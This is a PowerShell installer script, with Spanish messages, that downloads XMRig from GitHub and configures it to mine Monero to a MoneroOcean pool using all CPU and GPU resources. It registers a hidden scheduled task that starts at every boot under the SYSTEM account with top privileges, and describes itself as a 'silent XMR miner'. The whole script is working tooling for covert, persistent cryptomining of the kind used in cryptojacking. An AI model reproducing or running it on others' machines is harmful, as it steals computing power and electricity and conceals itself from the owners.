
param(
    [Parameter(Mandatory=$true)]
    [string]$WalletAddress,

    [string]$PoolUrl = "gulf.moneroocean.stream",
    [int]$PoolPort = 10001,
    [string]$WorkerName = "worker",
    [string]$InstallDir = "$env:APPDATA\XMRig",
    [switch]$Reinstall,
    [switch]$Silent = $true
)

$TaskName = "XMRigMiner"
$ExeName = "xmrig.exe"
$ConfigPath = Join-Path $InstallDir "config.json"
$ExePath = Join-Path $InstallDir $ExeName
$DownloadUrl = "https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.20.0-msvc-win64.zip"
$ZipPath = "$env:TEMP\xmrig-temp.zip"

function Write-Status {
    param([string]$Msg, [string]$Color = "White")
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $Msg" -ForegroundColor $Color
}


Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force
Write-Status "⏹️  Procesos xmrig detenidos (si existían)"

if ($Reinstall) {
    Write-Status "🔄 Reinstalación forzada activada"
    if (Test-Path $InstallDir) {
        Remove-Item $InstallDir -Recurse -Force
        Write-Status "🗑️  Carpeta anterior eliminada: $InstallDir"
    }
    $null = Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    Write-Status "🧹 Tarea anterior eliminada"
}


if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

if ($Reinstall -or !(Test-Path $ExePath)) {
    Write-Status "⬇️  Descargando XMRig desde: $DownloadUrl" "Cyan"
    try {
        Invoke-WebRequest -Uri $DownloadUrl -OutFile $ZipPath -TimeoutSec 30 -UseBasicParsing
    } catch {
        Write-Status "❌ Error descargando: $_" "Red"
        exit 1
    }

    try {
        Write-Status "📦 Descomprimiendo archivo..." "Cyan"
        Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force

        # Buscar xmrig.exe dentro de cualquier subcarpeta
        $found = Get-ChildItem -Path $InstallDir -Recurse -Filter "xmrig.exe" | Select-Object -First 1
        if ($found) {
            Copy-Item $found.FullName $ExePath -Force
            Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue
            Write-Status "✅ XMRig descomprimido y listo" "Green"
        } else {
            Write-Status "❌ No se encontró xmrig.exe en el ZIP. Verifica la URL." "Red"
            exit 1
        }
    } catch {
        Write-Status "❌ Error descomprimiendo: $_" "Red"
        exit 1
    }
} else {
    Write-Status "✅ XMRig ya instalado. Usando versión local." "Green"
}


$config = @{
    "autosave" = $true
    "cpu" = @{
        "enabled" = $true
        "huge-pages" = $true
        "hw-aes" = $true
        "priority" = 5
    }
    "opencl" = @{ "enabled" = $true }
    "cuda" = @{ "enabled" = $true }
    "pools" = @(
        @{
            "url" = "$PoolUrl`:$PoolPort"
            "user" = $WalletAddress
            "pass" = $WorkerName
            "keepalive" = $true
            "tls" = $true
        }
    )
    "donate-level" = 1
    "log-file" = "xmrig.log"
    "print-time" = 60
} | ConvertTo-Json -Depth 10

Set-Content -Path $ConfigPath -Value $config -Encoding UTF8
Write-Status "📁 Configuración guardada en: $ConfigPath" "Green"

$action = New-ScheduledTaskAction -Execute "`"$ExePath`"" -WorkingDirectory $InstallDir
$trigger = New-ScheduledTaskTrigger -AtStartup  
$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -ExecutionTimeLimit (New-TimeSpan -Hours 0) `
    -Hidden:$Silent

$principal = New-ScheduledTaskPrincipal `
    -UserId "NT AUTHORITY\SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel Highest

Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

try {
    Register-ScheduledTask `
        -TaskName $TaskName `
        -Action $action `
        -Trigger $trigger `
        -Settings $settings `
        -Principal $principal `
        -Description "Minero XMR silencioso (arranque automático)" `
        -Force

    Write-Status "✅ Tarea programada creada: '$TaskName' (al arranque del sistema)" "Green"
} catch {
    Write-Status "❌ Error al crear tarea: $_" "Red"
    exit 1
}

Enable-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue


$tarea = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
if ($tarea -and $tarea.State -eq "Ready") {
    Write-Status "🎯 Tarea lista y HABILITADA para el próximo arranque" "Green"
} else {
    Write-Status "⚠️  La tarea no está habilitada. Verifica permisos." "Yellow"
}

if ($Silent) {
    Write-Status "💡 Para probar ahora, reinicia o ejecuta manualmente la tarea." "Yellow"
    Write-Host "➡️  Usa: 'Start-ScheduledTask -TaskName '$TaskName'" -ForegroundColor Gray
} else {
    Write-Status "🚀 Iniciando XMRig ahora..." "Yellow"
    Start-Process -FilePath $ExePath -WorkingDirectory $InstallDir -NoNewWindow
}

Write-Host "`n" + "="*60
Write-Host "✅ Minería XMR lista." -ForegroundColor Green
Write-Host "🔄 Se ejecutará al arrancar el sistema." -ForegroundColor Green
Write-Host "📁 Carpeta: $InstallDir" -ForegroundColor Gray
Write-Host "📋 Estado tarea: Get-ScheduledTask -TaskName '$TaskName'" -ForegroundColor Gray
Write-Host "="*6